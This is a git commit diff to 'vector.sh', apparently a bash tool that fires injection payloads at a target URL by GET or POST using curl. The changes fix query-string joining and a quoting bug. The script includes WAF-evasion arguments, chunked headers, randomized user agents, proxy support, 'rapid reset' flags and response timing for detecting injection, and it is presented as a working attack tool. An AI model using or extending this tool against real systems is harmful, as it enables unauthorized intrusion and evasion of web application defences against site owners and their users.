d506dae858a705fc9f403c520e1106199144222e
Skokoo <nourriwilliam789@gmail.com>
2026-08-09 16:20:45 +0700

    Update vector.sh

--- Imcurvin/vector.sh
+++ Imcurvin/vector.sh
@@ -82,23 +82,27 @@
           esac
           output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
         fi
-        echo -e "$output_text"
-        
+        echo -e "$output_text"                
+        local join_char="?"
+        if [[ "$target_url" == *"?"* ]]; then
+          join_char="&"
+        fi
+       
         if [ "$current_method" = "POST" ]; then          
           local post_data="${current_param}=${active_payload}"
-          
+       
           curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
             -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
             -w "%{time_total}|%{http_code}" \
-            "${target_url}${default_path}")
-        else          
+            "$target_url")
+        else                   
           curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
             -m 12 -A "$random_ua" -s -o /dev/null \
             -w "%{time_total}|%{http_code}" \
-            "${clean_target_url}${default_path}?${current_param}=${active_payload}")
-        fi  
+            "${target_url}${join_char}${current_param}=${active_payload}")
+        fi                  
 
         local stopwatch
         local http_status
@@ -197,22 +201,27 @@
         fi
         
         local current_method="${REQ_METHOD:-POST}"        
-           
-        if [ $current_method" = "POST" ]; then
+                
+        local join_char="?"
+        if [[ "$target_url" == *"?"* ]]; then
+          join_char="&"
+        fi
+        
+        if [ "$current_method" = "POST" ]; then          
           local post_data="${current_param}=${active_payload}"
           
           curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args "${chunked_headers[@]}" \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
             -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
             -w "%{time_total}|%{http_code}" \
-            "${target_url}${default_path}")
-        else          
+            "$target_url")
+        else                    
           curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args \
             --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
             -m 12 -A "$random_ua" -s -o /dev/null \
             -w "%{time_total}|%{http_code}" \
-            "${clean_target_url}${default_path}?${current_param}=${active_payload}")
-        fi  
+            "${target_url}${join_char}${current_param}=${active_payload}")
+        fi                
 
         local stopwatch
         local http_status
